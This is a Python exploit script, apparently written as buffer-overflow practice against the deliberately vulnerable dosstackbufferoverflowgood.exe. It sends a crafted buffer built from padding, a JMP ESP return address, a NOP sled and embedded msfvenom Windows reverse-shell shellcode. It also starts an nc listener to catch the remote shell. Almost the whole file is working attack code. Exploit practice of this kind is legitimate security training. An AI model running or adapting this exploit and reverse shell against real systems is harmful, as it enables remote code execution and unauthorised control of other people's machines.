#!/usr/bin/python3
# Application exploit for crashing dosstackbufferoverflowgood.exe app for simple buffer 
# overflow practice.
#
# Written by Rob Flemen
# Author Github: https://github.com/rflemen
# Author YouTube: https://www.youtube.com/@RobFlemen 
# 12/24/2025

import socket
import time
import argparse
import subprocess # needed for Popen

# Setup arguments and parser
parser = argparse.ArgumentParser(description="Exploits w/ buffer overflow, generates reverse shell.")
parser.add_argument("--ip", required=True, help="Target IP")
parser.add_argument("--port", required=True, type=int, help="Target port")
parser.add_argument("--lport", default=4444, type=int, help="Local port for reverse shell listener") # If you change this, change in shellcode too!
args = parser.parse_args()


### PRINT BANNER ###        
print("eXPLoiT By:                ")
print("        ,------.           ")            
print(",--,--, |  .--. ',--,--,--.") 
print("|      ;|  '--' ||        |") 
print("|  ||  ||  | --' |  |  |  |") 
print("`--''--'`--'     `--`--`--'")                            
print("Dos Stack Buffer Overflow Exploit")
time.sleep(3)


### SETUP LISTENER ###
print(f"[\033[92m\N{CHECK MARK}\033[00m] Starting nc listener on port {args.lport}...")
listener = subprocess.Popen(["nc", "-lvnp", str(args.lport)])

# Give listener time to bind
time.sleep(2)


### EXPLOIT CODE ###
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.ip, args.port))

offset = 146

jmp_esp = b"\xC3\x14\x04\x08"
nops = b"\x90" * 16

# SHELLCODE - you need to generate your own by modifying statement below!
# msfvenom -p windows/shell_reverse_tcp LHOST=10.100.2.5 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f py

buf =  b""
buf += b"\xda\xd0\xd9\x74\x24\xf4\xb8\x55\x18\xf1\x34\x5b"
buf += b"\x33\xc9\xb1\x52\x83\xc3\x04\x31\x43\x13\x03\x16"
buf += b"\x0b\x13\xc1\x64\xc3\x51\x2a\x94\x14\x36\xa2\x71"
buf += b"\x25\x76\xd0\xf2\x16\x46\x92\x56\x9b\x2d\xf6\x42"
buf += b"\x28\x43\xdf\x65\x99\xee\x39\x48\x1a\x42\x79\xcb"
buf += b"\x98\x99\xae\x2b\xa0\x51\xa3\x2a\xe5\x8c\x4e\x7e"
buf += b"\xbe\xdb\xfd\x6e\xcb\x96\x3d\x05\x87\x37\x46\xfa"
buf += b"\x50\x39\x67\xad\xeb\x60\xa7\x4c\x3f\x19\xee\x56"
buf += b"\x5c\x24\xb8\xed\x96\xd2\x3b\x27\xe7\x1b\x97\x06"
buf += b"\xc7\xe9\xe9\x4f\xe0\x11\x9c\xb9\x12\xaf\xa7\x7e"
buf += b"\x68\x6b\x2d\x64\xca\xf8\x95\x40\xea\x2d\x43\x03"
buf += b"\xe0\x9a\x07\x4b\xe5\x1d\xcb\xe0\x11\x95\xea\x26"
buf += b"\x90\xed\xc8\xe2\xf8\xb6\x71\xb3\xa4\x19\x8d\xa3"
buf += b"\x06\xc5\x2b\xa8\xab\x12\x46\xf3\xa3\xd7\x6b\x0b"
buf += b"\x34\x70\xfb\x78\x06\xdf\x57\x16\x2a\xa8\x71\xe1"
buf += b"\x4d\x83\xc6\x7d\xb0\x2c\x37\x54\x77\x78\x67\xce"
buf += b"\x5e\x01\xec\x0e\x5e\xd4\xa3\x5e\xf0\x87\x03\x0e"
buf += b"\xb0\x77\xec\x44\x3f\xa7\x0c\x67\x95\xc0\xa7\x92"
buf += b"\x7e\xe5\x53\x9e\x7b\x91\x99\x9e\x92\x3d\x17\x78"
buf += b"\xfe\xad\x71\xd3\x97\x54\xd8\xaf\x06\x98\xf6\xca"
buf += b"\x09\x12\xf5\x2b\xc7\xd3\x70\x3f\xb0\x13\xcf\x1d"
buf += b"\x17\x2b\xe5\x09\xfb\xbe\x62\xc9\x72\xa3\x3c\x9e"
buf += b"\xd3\x15\x35\x4a\xce\x0c\xef\x68\x13\xc8\xc8\x28"
buf += b"\xc8\x29\xd6\xb1\x9d\x16\xfc\xa1\x5b\x96\xb8\x95"
buf += b"\x33\xc1\x16\x43\xf2\xbb\xd8\x3d\xac\x10\xb3\xa9"
buf += b"\x29\x5b\x04\xaf\x35\xb6\xf2\x4f\x87\x6f\x43\x70"
buf += b"\x28\xf8\x43\x09\x54\x98\xac\xc0\xdc\xb8\x4e\xc0"
buf += b"\x28\x51\xd7\x81\x90\x3c\xe8\x7c\xd6\x38\x6b\x74"
buf += b"\xa7\xbe\x73\xfd\xa2\xfb\x33\xee\xde\x94\xd1\x10"
buf += b"\x4c\x94\xf3"

shellcode = buf

buffer = b"A" * offset + jmp_esp + nops + shellcode
buffer += b"\n"

### TIME TO HACK! ###
print("[\033[92m\N{CHECK MARK}\033[00m] Sending payload of", len(buffer), "bytes...")
time.sleep(2)
s.send(buffer)
print("[\033[92m\N{CHECK MARK}\033[00m] Payload sent. Here comes the shell...")
s.close()
time.sleep(2)

# Wait for the connection back!
listener.wait()
